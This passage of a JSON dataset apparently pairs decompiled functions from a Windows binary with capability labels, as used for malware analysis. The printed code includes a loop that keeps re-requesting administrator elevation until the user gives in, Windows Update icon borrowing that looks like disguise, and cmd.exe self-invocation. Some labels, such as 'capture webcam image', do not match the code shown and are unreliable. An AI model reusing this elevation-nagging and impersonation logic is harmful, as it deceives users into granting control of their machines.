        "decompiled_code": "\nuint __cdecl fcn.004031bb(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_3ch;\n    char *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    \n    fcn.00404077(&var_3ch, 0, 0x3c);\n    pcVar1 = _sym.imp.SHELL32.dll_ShellExecuteExA;\n    var_20h = 0;\n    var_2ch = *0x407088;\n    var_3ch = 0x3c;\n    var_30h = \"runas\";\n    var_28h = *0x407090;\n    while( true ) {\n        iVar2 = (*pcVar1)(&var_3ch);\n        if (iVar2 != 0) break;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar2 != 0x4c7) break;\n        fcn.00403162(*(*0x407094 * 0x44 + 0x40703c));\n    }\n    (*_sym.imp.USER32.dll_SetTimer)(arg_8h, 1, 0x14, 0);\n    return 1;\n}\n",
        "token_count": 286
    },
    "0040304b": {
        "rules": [
            "capture webcam image/a2846bc2811e4b8ab7e688af0a834a2e"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040304b(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryExA)(\"wusa.exe\", 0, 0x20);\n    if (iVar2 != 0) {\n        iVar3 = (*_sym.imp.USER32.dll_LoadIconW)(iVar2, 0x65);\n        if (iVar3 != 0) {\n            (*_sym.imp.USER32.dll_SendMessageW)(param_1, 0x80, 1, iVar3);\n        }\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar2);\n    }\n    uVar4 = (*_sym.imp.USER32.dll_GetDlgItem)(param_1, 0x3eb);\n    uVar5 = (*_sym.imp.USER32.dll_GetWindowLongW)(uVar4, 0xfffffff0);\n    (*_sym.imp.USER32.dll_SetWindowLongW)(uVar4, 0xfffffff0, uVar5 | 8);\n    (*_sym.imp.USER32.dll_SendMessageW)(uVar4, 0x40a, 1, 0x1e);\n    (*_sym.imp.USER32.dll_SetWindowTextW)(param_1, *(*0x407094 * 0x44 + 0x407004));\n    pcVar1 = _sym.imp.USER32.dll_SetDlgItemTextW;\n    (*_sym.imp.USER32.dll_SetDlgItemTextW)(param_1, 0x3f0, *(*0x407094 * 0x44 + 0x40700c));\n    (*pcVar1)(param_1, 0x3f1, *(*0x407094 * 0x44 + 0x407008));\n    (*_sym.imp.USER32.dll_SetTimer)(param_1, 1, 3000, 0);\n    return;\n}\n",
        "token_count": 438
    },
    "004034e1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.004034e1(int16_t *arg_8h)\n\n{\n    int16_t *var_4h;\n    \n    var_4h = arg_8h;\n    for (; *arg_8h != 0; arg_8h = arg_8h + 1) {\n        if (*arg_8h == 0x5c) {\n            var_4h = arg_8h + 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 113
    },
    "00402be0": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00402be0(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0x23, 0, 0, param_2);\n    pcVar1 = _sym.imp.KERNEL32.dll_lstrcatW;\n    if (-1 < iVar2) {\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(param_2, 0x40566c);\n        (*pcVar1)(param_2, param_1);\n        (*pcVar1)(param_2, 0x40566c);\n        (*pcVar1)(param_2, param_1);\n        (*pcVar1)(param_2, 0x405670);\n    }\n    return -1 < iVar2;\n}\n",
        "token_count": 194
    },
    "00402d64": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\nuint fcn.00402d64(void)\n\n{\n    uint uVar1;\n    uint lpString1;\n    uint var_108h;\n    uint lpFilename;\n    \n    uVar1 = *0x4070b0;\n    (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryA)(&lpString1, 0x104);\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(&lpString1, \"\\\\system32\\\\cmd.exe\");\n    (*_sym.imp.KERNEL32.dll_lstrcpyA)(&var_108h, \" /c \\\"\");\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(uVar1, &lpFilename, 0x104);\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(&var_108h, 0x405698);\n    fcn.00403465(&var_108h);\n    return 1;\n}\n",
        "token_count": 196
    },
    "00402c2a": {
        "rules": [
            "move file"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402c2a(uint param_1, uint param_2)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    uint lpExistingFileName;\n    \n    fcn.00403519(param_1);\n    iVar2 = fcn.004034e1(param_2);\n    uVar1 = *(iVar2 + -2);\n    *(iVar2 + -2) = 0;\n    (*_sym.imp.KERNEL32.dll_MoveFileW)(param_1, param_2);\n    *(iVar2 + -2) = uVar1;\n    return;\n}\n",
        "token_count": 131
    },
    "00403162": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403162(uint lpCaption)\n\n{\n    int32_t iVar1;\n    \n    if (*0x4070f8 == NULL) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"user32.dll\");\n        if (iVar1 == 0) {\n            return;\n        }\n        *0x4070f8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"MessageBoxTimeoutW\");\n        if (*0x4070f8 == NULL) {\n            (*_sym.imp.USER32.dll_MessageBoxW)();\n            return;\n        }\n    }\n    (**0x4070f8)();\n    return;\n}\n",
        "token_count": 144
    }
}